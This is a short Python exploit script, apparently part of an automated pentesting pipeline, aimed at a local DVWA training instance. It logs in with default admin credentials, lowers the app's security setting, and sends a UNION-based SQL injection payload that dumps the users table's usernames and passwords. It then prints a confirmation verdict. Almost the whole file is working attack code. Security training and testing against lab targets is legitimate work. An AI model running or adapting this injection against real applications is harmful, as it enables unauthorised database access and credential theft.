#!/usr/bin/env python3
"""SQLi UNION probe for /vulnerabilities/sqli/ — Brain Engine v1"""
import requests, re, sys
B = 'http://172.17.0.1:3100'
marker = sys.argv[1] if len(sys.argv) > 1 else 'SQLI7719-7B2E4C9A'
s = requests.Session()
r = s.get(B + '/login.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok = t.group(1) if t else ''
s.post(B + '/login.php', data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': tok}, timeout=10)
r = s.get(B + '/security.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok2 = t.group(1) if t else ''
s.post(B + '/security.php', data={'security': 'low', 'seclev_submit': 'Submit', 'user_token': tok2}, timeout=10)
# UNION dump all users
payload = f"1' UNION SELECT user, password FROM users-- -"
r = s.get(B + f'/vulnerabilities/sqli/?id={payload}&Submit=Submit', timeout=15)
# Check for all 5 DVWA users
users = [u for u in ['admin', 'gordonb', '1337', 'pablo', 'smithy'] if u in r.text.lower()]
users_found = len(users)
print(f"MARKER: {marker}")
print(f"USERS_FOUND: {users_found}/5")
print(f"STATUS: {r.status_code}")
if users_found >= 5:
    # Rule #49: signal-bearing evidence for the pipeline's gate — the
    # actual dumped usernames, per-result target content.
    print(f"EVIDENCE: UNION SELECT dumped database users: {', '.join(users)}")
    print(f"VERDICT: CONFIRMED")
else:
    print(f"VERDICT: FAILED")
